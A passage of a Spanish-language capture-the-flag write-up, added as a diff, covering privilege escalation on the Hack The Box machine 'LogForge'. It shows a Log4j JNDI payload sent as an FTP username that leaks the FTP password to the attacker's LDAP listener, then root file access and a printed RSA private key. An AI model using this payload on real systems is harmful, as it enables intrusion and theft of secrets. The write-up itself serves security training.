@@ -150,3 +150,129 @@ bash: no job control in this shell
 tomcat@LogForge:/var/lib/tomcat9$ 
 ```
 
+-- Intrusion Completada -- Entramos como el User - Tomcat
+
+# Escalada de Privilegios 
+
+Procedemos a enumerar el servidor para ver si hay alguna cosita interesante a nivel de la misma.. 
+Cuando hacemos el comando ` ps -aux ` para listar los comandos ejecutados a nivel de sistema encontramos:
+
+```bash
+root         981  0.0  0.0   7244  3360 ?        S    19:17   0:00 /usr/sbin/CRON -f
+root         990  0.0  0.0   2608   604 ?        Ss   19:17   0:00 /bin/sh -c /root/run.sh
+root         992  0.0  0.0   5648  3156 ?        S    19:17   0:00 /bin/bash /root/run.sh
+root         993  0.3  1.8 3576972 76540 ?       Sl   19:17   0:01 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
+```
+Identificamos que corre el servicio FTP internamente y que corre Java por detras, en el cual nos dan la imagen ftpServer-1.0-SNAPSHOP-all.jar en la raiz del equipo para analizar a bajo nivel que esta ocurriendo por detras, y vemos que se listan las variables de entorno `fpt_user y ftp_password `
+
+Tal que podriamos intentar hacer una injeccion y recibir las variables de FTP atraves de la interceptacion del trafico con la herramienta `Wireshark` filtrando por `tcp.port == 1389` y haciendo un `Seguimiento al flujo de datos` para listar el `usuario ftp y su password`
+
+Injeccion → Teniendo nuestro server con ldap montado podriamos probar a injecctar algo como esto para ver si podemos listar las variables nombradas anteriormente.
+
+```bash 
+${jndi:ldap://10.10.16.7:1389/${env:ftp_password}}	
+```
+```bash
+tomcat@LogForge:/tmp$ ftp localhost
+Connected to localhost.
+220 Welcome to the FTP-Server
+Name (localhost:tomcat): ${jndi:ldap://10.10.16.7:1389/${env:ftp_password}}
+530 Not logged in
+Login failed.
+Remote system type is FTP.
+```
+Donde vemos que recibimos la password del Servicio FTP atraves de Wireshark en texto claro
+
+Archivo de Credenciales FTP
+```bash
+user --> ftp_user: ippsec
+pass --> ftp_password: log4j_env_leakage 
+```
+Ahora podriamos conectarnos al servicio FTP interno con las credenciales obtenidas y como vemos estariamos como root y podriamos visualizar la flag y todos los archivos a nivel Admministrador por FTP.
+
+```bash
+tomcat@LogForge:/tmp$ ftp localhost
+Connected to localhost.
+220 Welcome to the FTP-Server
+Name (localhost:tomcat): ippsec
+331 User name okay, need password
+Password:
+230-Welcome to HKUST
+230 User logged in successfully
+Remote system type is FTP.
+ftp> dir
+200 Command OK
+125 Opening ASCII mode data connection for file list.
+.profile
+.ssh
+snap
+ftpServer-1.0-SNAPSHOT-all.jar
+.bashrc
+.selected_editor
+run.sh
+.lesshst
+.bash_history
+root.txt
+.viminfo
+.cache
+226 Transfer complete.
+
+ftp> get root.txt
+local: root.txt remote: root.txt
+200 Command OK
+150 Opening ASCII mode data connection for requested file root.txt
+WARNING! 1 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 File transfer successful. Closing data connection.
+33 bytes received in 0.00 secs (78.9867 kB/s)
+
+ftp> cd .ssh
+250 The current directory has been changed to /root/.ssh
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+200 Command OK
+150 Opening ASCII mode data connection for requested file id_rsa
+WARNING! 28 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 File transfer successful. Closing data connection.
+1680 bytes received in 0.00 secs (404.9926 kB/s)
+```
+Procedemos a visualizar los recursos descargador en el directorio /tmp/
+```bash
+tomcat@LogForge:/tmp$ ls
+hsperfdata_tomcat  id_rsa  root.txt
+
+tomcat@LogForge:/tmp$ cat root.txt 
+bc4fe3cd9e92b620cbd13exxxxxxxxxxxxxx
+
+tomcat@LogForge:/tmp$ cat id_rsa 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA6rJ1Y88QDL/MLtv+Ml8TwH7JSWxNIc8/8GeEa3OkWzv9z4cv
+5owDnHv5s9m80fREmO6fjqELVM1A/dRWLsatIHJuyNmrTQ/viJTPopCBBdjG3rpQ
+74Ng5OQc7KxVHU7qtrCgYXJ8t8FJdT/456halp2neOOqqWUjTx8JeM9v9x1ku09P
+omAXyBcq2bx+EyUlwJr+0tMUDCWzdLH/+iXVwuTudx9RegOk2Q3IHlTnj1UhWkDk
+SVjwudGzHn7AyyNjc1ISrcWnBtYNKwGkyXp61wnQ/Lx3+QdKVFfgBzoxaA6fsDzs
+LftTgYa7skTgTGrVJIY2rEktS4To6MQjYEvSnQIDAQABAoIBAAqGZENMluCrfUGg
+tf6WSvF3/hjf1XmtrKVgTwzui7FXuGMlId3J66OJ38HUAua7eJQPJ3KjADoWVlLL
+we2pFTx+RT+Wm1sCWvCaE9Grf02+0fRNELIdByxcmnt2ov6Eenwk4ZxdIQCwl1W9
+v7DL2PwmJ8uBEjc0hOfYcXlMfC3tuomWX1RK75SIMMFI1NbRKXyo4zGpdPhjiwVq
+4nZKuYapfcpxus/7m/ChEETrmdZ+iYn2wwQ3Quu9HKRGCZDx+sKBWQSdZMmTdqkR
+wc0Xmfoxkqb+2NxD8zLfcHsf1fEJt+y0wcWf/B20oPlyuasHjEhzxehAUlV+i4XB
+zB6UeoECgYEA9ZBxRLCHbb4A4d5Ca2DI0Xi6rcSPJYOrDLYBLS2bO3JyVcqbUbwr
+rzy7XLG/8l81htsMDBe7M2HhTv6zBpAzL8D3ru5DCd+ASVJsngl/Qn0R1jxlaXLf
+yGKS1axZ3eJyOdG0ud00BYPbXBYDRWp+nA3SQIcVAGTychWR6EanzP0CgYEA9KvK
+MLCrSzqfzEtjPat6s8NFSI8JQWIFdcutb9U8T85mMCd2NtEOlKSCbEvt00vKPP17
+UFAUGkixYabV7sF3loSdJza4aM53dC+mdWK+luCr3RYYLgvKAQuViacQqdp68/yc
+XPalxxxx3Y6FGdCoQRouqQ5GgOKpuDbQ29yz3iECgYEAuH4a+3Z9aU/1Lb1kvXPr
+rKU968vfmFnCKzyayayYEiO8DwS3iMMNNw0z30KUaa5qcrUj6fnyZXpGYqktK+Mu
+8dPSwpSzvTk0EuJgRKPx/qwkuIaL0pvB0bVtiCeDJRc6poINfA7bRMF6D0dikcae
+9PPVYTGb773oARp/krly3KkCgYEA7s1hKYa1mVZds0r9UKq2tw9m5vvcf7lJNQCX
+hehs1kPQTz2kzrna7k9mkIbHWAzIFiEdo3SVOlYq8vGgKkkgDIPg0u5ArOKfioIb
+iMTY2m/srnurG/4bqkuBJ3os9GsuyEaM4ttFEsUoimlZFaonHmuMkSpCu/b+ybKO
+xZiy4aECgYBXh3aZHQCaPxBbhC8yqBjATQn+k9dDrh/PDawW1flXsnyU+pfmYlpy
+hr+/FHRFPDPC4Fu3AHmk8//Xvuf3FDLj9n758hJ+R9Gq2fkesvcZ8xvfQHjr/nla
+xAziiX8mpKJQnqyusg/P/J8r/O2DAObRxaQd7k4oiqQ0lEWjqBVtYA==
+-----END RSA PRIVATE KEY-----
+``` 
+
+Maquina y Vulnerabilidad Log4j para Tomcat 9 y FtpServer by HTB H4cked K0H4ck
